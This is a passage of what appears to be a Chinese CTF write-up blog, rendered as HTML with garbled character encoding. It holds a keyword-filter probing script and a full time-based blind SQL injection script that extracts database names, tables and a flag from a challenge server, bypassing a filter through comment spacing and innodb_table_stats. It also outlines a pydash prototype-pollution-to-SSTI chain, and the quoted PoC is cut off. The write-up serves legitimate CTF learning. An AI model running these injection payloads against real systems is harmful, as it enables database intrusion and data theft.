class="string">&quot;if&quot;</span>,</span><br><span class="line"><span class="string">&quot;xor&quot;</span>,</span><br><span class="line"><span class="string">&quot;not&quot;</span>,</span><br><span class="line"><span class="string">&quot;table_name&quot;</span>,</span><br><span class="line"><span class="string">&quot;CHAR&quot;</span>,</span><br><span class="line"><span class="string">&quot;group_concat&quot;</span>,</span><br><span class="line"><span class="string">&quot;information&quot;</span>,</span><br><span class="line"><span class="string">&quot;schema&quot;</span>,</span><br><span class="line"><span class="string">&quot;columns&quot;</span>,</span><br><span class="line"><span class="string">&quot;regexp&quot;</span>,</span><br><span class="line"><span class="string">&quot;greatest&quot;</span>,</span><br><span class="line"><span class="string">&quot;ascii&quot;</span>,</span><br><span class="line"><span class="string">&quot;substr&quot;</span>,</span><br><span class="line"><span class="string">&quot;strcmp&quot;</span>,</span><br><span class="line"><span class="string">&quot;in&quot;</span>,</span><br><span class="line"><span class="string">&quot;between&quot;</span>,</span><br><span class="line"><span class="string">&quot;database&quot;</span>,</span><br><span class="line"><span class="string">&quot;offset&quot;</span>,</span><br><span class="line"><span class="string">&quot;limit&quot;</span>,</span><br><span class="line"><span class="string">&quot;sleep&quot;</span>,</span><br><span class="line"><span class="string">&quot;benchmark&quot;</span>,</span><br><span class="line"><span class="string">&quot;bin&quot;</span>,</span><br><span class="line"><span class="string">&quot;mid&quot;</span>,</span><br><span class="line"><span class="string">&quot;substring&quot;</span>,</span><br><span class="line"><span class="string">&quot;updatexml&quot;</span>,</span><br><span class="line"><span class="string">&quot; &quot;</span>,</span><br><span class="line"><span class="string">&quot;--&quot;</span>,</span><br><span class="line"><span class="string">&quot;\&#x27;&quot;</span>,</span><br><span class="line"><span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"><span class="string">&quot;()&quot;</span>,</span><br><span class="line"><span class="string">&quot;-&quot;</span>,</span><br><span class="line"><span class="string">&quot;+&quot;</span>,</span><br><span class="line"><span class="string">&quot;#&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&quot;</span>,</span><br><span class="line"><span class="string">&quot;/&quot;</span>,</span><br><span class="line"><span class="string">&quot;!&quot;</span>,</span><br><span class="line"><span class="string">&quot;,&quot;</span>,</span><br><span class="line"><span class="string">&quot;`&quot;</span>,</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span>,</span><br><span class="line"><span class="string">&quot;|&quot;</span>,</span><br><span class="line"><span class="string">&quot;;&quot;</span>,</span><br><span class="line"><span class="string">&quot;^&quot;</span>,</span><br><span class="line"><span class="string">&quot;%&quot;</span>,</span><br><span class="line"><span class="string">&quot;@&quot;</span>,</span><br><span class="line"><span class="string">&quot;=&quot;</span>,</span><br><span class="line"><span class="string">&quot;&lt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;&quot;</span>]</span><br><span class="line"></span><br><span class="line">temp = <span class="string">&quot;NO,Hacker&quot;</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/worker.php&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>:i&#125;</span><br><span class="line">    rsp = post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> temp <span class="keyword">in</span> rsp.text:</span><br><span class="line">        a.append(i)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#[&#x27;update&#x27;, &#x27;delete&#x27;, &#x27;drop&#x27;, &#x27;insert&#x27;, &#x27;join&#x27;, &#x27;hex&#x27;, &#x27;CHAR&#x27;, &#x27;information&#x27;, &#x27;updatexml&#x27;, &#x27; &#x27;, &#x27;--&#x27;, &#x27;=&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;]</span></span><br></pre></td></tr></table></figure><p>â€‹æœ€åè·‘å‡ºæ¥å’Œæˆ‘é¢„è®¡çš„å·®ä¸å¤šï¼Œç„¶åå› ä¸ºåˆæ˜¯å¯ä»¥è¾“å…¥å­—ç¬¦ç­‰ç­‰ï¼Œæ¨æµ‹è¿˜æ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œéšæœºæ„é€ ä¸€ä¸‹ payload çœ‹çœ‹èƒ½å¦æˆåŠŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://154.64.254.169:33161/worker.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;111&#x27;/**/or/**/if((select/**/database())/**/like/**/database(),sleep(5),sleep(0))#&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>:payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">istime</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = post(url,data=data,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;timeout&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(istime(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#timeout</span></span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥ç›²æ³¨ï¼Œå› ä¸ºè¿‡æ»¤äº† infomationï¼Œæ‰€ä»¥éœ€è¦ç”¨ innodb æ¥ç»•è¿‡ï¼Œå…ˆè·‘ï¼Œç›´æ¥æ¢­å“ˆï¼ˆè„šæœ¬æ¯æ¬¡çš„æ—¶é—´ä¼šå¾ˆé•¿ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†ä¿è¯æ­£ç¡®ç‡ï¼Œå› ä¸ºè¿œç¨‹æµ‹è¯•çš„æ—¶å€™å‡ºç°äº†æœåŠ¡å™¨æ‰›ä¸ä½çš„æƒ…å†µï¼Œæ‰€ä»¥ï¼Œéœ€è¦å¢åŠ ç­‰å¾…æ—¶é•¿æ¥é˜²æ­¢æœåŠ¡å™¨å®•æœºï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æµ‹è¯•çš„æ—¶å€™æœåŠ¡å™¨æœ‰ç‚¹é—®é¢˜ï¼Œçˆ†ç ´çš„æ—¶å€™æ€»æ˜¯è¦å‡ºé—®é¢˜ï¼Œå»ºè®®æ¯ä¸€ä¸ªå‡½æ•°å¤šè·‘å‡ æ¬¡ä¿è¯æˆåŠŸç‡ï¼Œæˆ–è€…æ¯æ¬¡å¤šä¿®æ”¹ä¸€äº›timeå’Œsleepçš„æ—¶é•¿ä¿è¯æ­£ç¡®ç‡</span></span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">alpha = <span class="string">&quot;&quot;&quot;&#123;_&#125;[]-&quot;&quot;&quot;</span> + string.ascii_letters + string.digits</span><br><span class="line">url = <span class="string">&quot;http://154.64.254.169:33113/worker.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">istime</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = post(url,data=data,timeout=<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“é•¿åº¦ä¸ºï¼š7</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_len</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/length(database()))/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>:payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“é•¿åº¦ä¸ºï¼š%d&quot;</span>%i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•°æ®åº“åä¸ºgreatsql</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if(substr(database(),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“çš„åå­—æ˜¯&quot;</span>+name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“çš„ä¸ªæ•°ä¸º4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((seLect/**/COUNT(database_name)/**/fRom/**/mysql.innodb_table_stats)/**/like/**/&#123;&#125;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“çš„ä¸ªæ•°ä¸º&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># [10, 5, 5, 7]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_len_list</span>():</span><br><span class="line">    name_len_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(database_name)/**/from/**/mysql.innodb_table_stats/**/limit/**/&#123;&#125;,1)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name_len_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name_len_list)</span><br><span class="line">    <span class="keyword">return</span> name_len_list</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¸€ä¸ªæŸ¥è¯¢ç»“æœä¸ºå››æ¬¡ï¼Œæ‰€ä»¥æ‰‹åŠ¨æŸ¥å››æ¬¡ï¼Œæ²¡è·‘å®Œä¸€æ¬¡ï¼Œä¿®æ”¹limitåé¢çš„å‚æ•°ï¼Œä»¥åŠç¬¬ä¸€å±‚forå¾ªç¯çš„å‚æ•°</span></span><br><span class="line"><span class="comment"># flag1shere</span></span><br><span class="line"><span class="comment"># mysql</span></span><br><span class="line"><span class="comment"># users</span></span><br><span class="line"><span class="comment"># workers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name_list</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(database_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/limit/**/3,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name += j</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“å‰æ•°æ®åº“çš„è¡¨æœ‰2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/count(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;å½“å‰æ•°æ®åº“çš„è¡¨æœ‰&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å› ä¸ºæµ‹å‡ºæ¥æœ‰ä¸¤ä¸ªè¡¨ï¼Œæ‰€ä»¥éœ€è¦æŸ¥ä¸¤æ¬¡</span></span><br><span class="line"><span class="comment"># å½“å‰æ•°æ®åº“è¡¨åé•¿åº¦ä¸º36</span></span><br><span class="line"><span class="comment"># å½“å‰æ•°æ®åº“è¡¨åé•¿åº¦ä¸º8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name_len</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;å½“å‰æ•°æ®åº“è¡¨åé•¿åº¦ä¸º&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å› ä¸ºå­˜åœ¨ä¸¤å¼ è¡¨ï¼Œæ‰€ä»¥å¾—æŸ¥ä¸¤æ¬¡</span></span><br><span class="line"><span class="comment"># flag_is_in_flag1shere_loockhere_flag</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">37</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(table_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(j,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•°æ®åº“çš„æ•°æ®ä¸ªæ•°ä¸º1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/count(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ•°æ®åº“çš„æ•°æ®ä¸ªæ•°ä¸º&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flagçš„é•¿åº¦ä¸º32</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_name_len</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/length(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flagçš„é•¿åº¦ä¸º&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hectf&#123;fl4g_1s_h5r5_n1ce_try_4_u&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_get</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">34</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/substr(flag,&#123;&#125;,1)/**/from/**/flag1shere.lookhere)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                flag += j</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># db_name_len()</span></span><br><span class="line"><span class="comment"># db_name()</span></span><br><span class="line"><span class="comment"># db_name_count()</span></span><br><span class="line"><span class="comment"># db_name_len_list()</span></span><br><span class="line"><span class="comment"># db_name_list()</span></span><br><span class="line"><span class="comment"># tb_count()</span></span><br><span class="line"><span class="comment"># tb_name_len()</span></span><br><span class="line"><span class="comment"># tb_name()</span></span><br><span class="line"><span class="comment"># flag_count()</span></span><br><span class="line"><span class="comment"># flag_name_len()</span></span><br><span class="line"><span class="comment"># flag_get()</span></span><br></pre></td></tr></table></figure><p>â€‹ç›´æ¥è·‘æœ€åä¸€ä¸ªå‡½æ•°å°±å¯ä»¥å¾—åˆ° flagï¼Œä½†æ˜¯æ—¶é—´ä¼šå¾ˆé•¿ï¼Œå…¶ä»–çš„æ˜¯ä¸ºäº†è®©è¿™ä¸ªé¢˜æœ‰å§‹æœ‰ç»ˆï¼Œå°½å¯èƒ½è·å¾—æ›´å¤šçš„æ•°æ®ã€‚</p><h3 id="ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™"><a class="markdownIt-Anchor" href="#ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™">#</a> ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™ï¼š</h3><p>â€‹çœ‹åˆ° <code>#pip install -v pydash==5.1.2</code>  çŸ¥æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</p><p>â€‹admin è·¯ç”±ä¸­å­˜åœ¨ sstiï¼Œæƒ³è¿›å»éœ€è¦ä¼ªé€  sessionã€‚setUserInfo è·¯ç”±å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼ŒæŠ“åŒ…æ”¹å‚æ•°ï¼Œå…ˆæ±¡æŸ“ keyï¼Œä¹‹åæ±¡æŸ“ WAF æ–‡ä»¶é‡Œçš„ blacklistï¼Œä¹‹åæ±¡æŸ“ user å¯¹è±¡é‡Œçš„ username æˆ–è€… setUserInfo æ”¹åè¿›è¡Œ sstiã€‚</p><p>â€‹è¿™é‡Œè´´ä¸€ä¸‹å¤§ä½¬çš„ pocï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span 